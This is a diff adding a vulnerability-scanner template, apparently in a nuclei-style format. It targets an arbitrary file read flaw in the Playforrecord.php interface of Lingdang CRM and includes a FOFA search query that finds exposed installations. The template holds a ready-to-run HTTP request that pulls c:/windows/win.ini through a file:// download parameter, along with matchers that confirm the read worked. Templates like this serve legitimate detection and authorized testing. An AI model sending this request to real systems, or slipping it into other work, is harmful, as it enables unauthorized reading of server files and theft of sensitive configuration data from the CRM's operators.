@@ -1,0 +1,24 @@
+## id: VEID-2025-0907
+## name: 灵当CRM系统接口Playforrecord接口处存在任意文件读取漏洞
+## author: hack007x
+## severity: high
+## tags: veid,file,veid2025
+## description: 灵当CRM系统接口Playforrecord.php接口处存在任意文件读取漏洞，允许攻击者通过恶意读取系统配置文件，获取敏感信息。
+## fofa-query: body="include/js/ldAjax.js"
+## verification: true
+
+
+GET /crm/modules/Accounts/Playforrecord.php?download=file:///c:/windows/win.ini HTTP/1.1
+Host: {{Hostname}}
+User-Agent: {{random_ua}}
+
+#@ condition: and
+#@ matcher: status_code == 200
+#@ matcher: header["Content-Type"] contains "xml"
+#@ matcher: body contains "[fonts]"
+#@ matcher: body contains "[extensions]"
+
+
+
+
+
